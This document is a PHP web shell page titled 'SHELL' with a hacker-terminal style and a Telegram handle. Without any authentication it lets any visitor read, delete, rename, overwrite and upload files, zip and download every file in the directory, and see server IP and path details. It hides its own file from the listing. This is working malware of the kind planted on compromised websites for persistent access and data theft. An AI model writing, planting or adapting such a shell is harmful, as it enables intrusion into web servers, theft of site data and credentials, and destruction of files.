<?php

function getUserIP() {
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

function getServerIP() {
    return gethostbyname(gethostname());
}

function getCurrentPath() {
    return getcwd();
}

function logAction($action) {
    file_put_contents('logs.txt', "[" . date("Y-m-d H:i:s") . "] " . $action . "\n", FILE_APPEND);
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $filename = $_POST['filename'] ?? '';

    switch ($action) {
        case 'view':
            if (file_exists($filename)) {
                header('Content-Type: text/plain');
                readfile($filename);
                logAction("Viewed source code of: $filename");
                exit();
            }
            break;

        case 'delete':
            if (file_exists($filename)) {
                unlink($filename);
                logAction("Deleted file: $filename");
            }
            break;

        case 'rename':
            $newname = $_POST['newname'] ?? '';
            if ($newname && file_exists($filename)) {
                $newname = basename($newname);
                rename($filename, $newname);
                logAction("Renamed $filename to $newname");
            }
            break;

        case 'edit':
            $content = $_POST['content'] ?? '';
            if (file_exists($filename)) {
                file_put_contents($filename, $content);
                logAction("Edited file: $filename");
            }
            break;

        case 'upload':
            if (!empty($_FILES['upload']['name'])) {
                $targetFile = basename($_FILES['upload']['name']);
                if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
                    logAction("Uploaded file: $targetFile");
                }
            }
            break;

        case 'download_all':
            $zip = new ZipArchive();
            $zipName = 'all_files.zip';
            if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));
                foreach ($files as $file) {
                    if (!$file->isDir() && $file->getFilename() !== basename(__FILE__)) {
                        $zip->addFile($file, $file->getFilename());
                    }
                }
                $zip->close();
                logAction("Downloaded all files.");
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipName . '"');
                readfile($zipName);
                unlink($zipName);
                exit();
            }
            break;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SHELL</title>
    <style>
        
        body { background-color: #121212; font-family: 'Consolas', monospace; color: #00ff9c; margin: 0; padding: 20px; }
        .container { width: 90%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8); }
        .terminal_toolbar { display: flex; justify-content: space-between; background: #2d2d2d; padding: 10px; border-radius: 5px; }
        .butt .btn { width: 13px; height: 13px; border-radius: 50%; margin-right: 8px; border: none; }
        .btn-color:nth-child(1) { background: #ff5f56; }
        .btn-color:nth-child(2) { background: #ffbd2e; }
        .btn-color:nth-child(3) { background: #27c93f; }
        .actions button, form button { background-color: #3a3a3a; border: none; color: #fff; padding: 10px 15px; margin: 5px; border-radius: 5px; cursor: pointer; }
        .actions button:hover { background-color: #4a4a4a; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #555; padding: 10px; text-align: left; }
        .log { background-color: #2d2d2d; padding: 15px; height: 200px; overflow-y: auto; border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
   
    <div class="terminal_toolbar">
        <div class="butt">
            <button class="btn btn-color"></button>
            <button class="btn"></button>
            <button class="btn"></button>
        </div>
        <p class="user">@a_telegram_user</p>
    </div>

    <div class="terminal_body">
        <pre><b>User IP:</b> <?php echo getUserIP(); ?> | <b>Server IP:</b> <?php echo getServerIP(); ?> | <b>Path:</b> <?php echo getCurrentPath(); ?></pre>


        <div class="actions">
            <form method="POST">
                <button name="action" value="download_all">📥 Download All Data</button>
                <button name="action" value="grab_ip">🌐 Grab IP</button>
            </form>
        </div>

       
        <h3>📁 File Manager</h3>
        <table>
            <?php foreach (scandir('.') as $file): ?>
                <?php if ($file !== basename(__FILE__)) : ?>
                    <tr>
                        <td><?php echo $file; ?></td>
                        <td>
                            <form method="POST">
                                <input type="hidden" name="filename" value="<?php echo $file; ?>">
                                <button name="action" value="view">👀 View</button>
                                <button name="action" value="delete">❌ Delete</button>
                                <input type="text" name="newname" placeholder="New name">
                                <button name="action" value="rename">✏️ Rename</button>
                            </form>
                        </td>
                    </tr>
                <?php endif; ?>
            <?php endforeach; ?>
        </table>

        
        <h3>📝 Logs</h3>
        <div class="log"><pre><?php echo file_get_contents('logs.txt'); ?></pre></div>

        
        <h3>📤 Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload" required>
            <button name="action" value="upload">⬆️ Upload</button>
        </form>
    </div>
</div>

</body>
</html>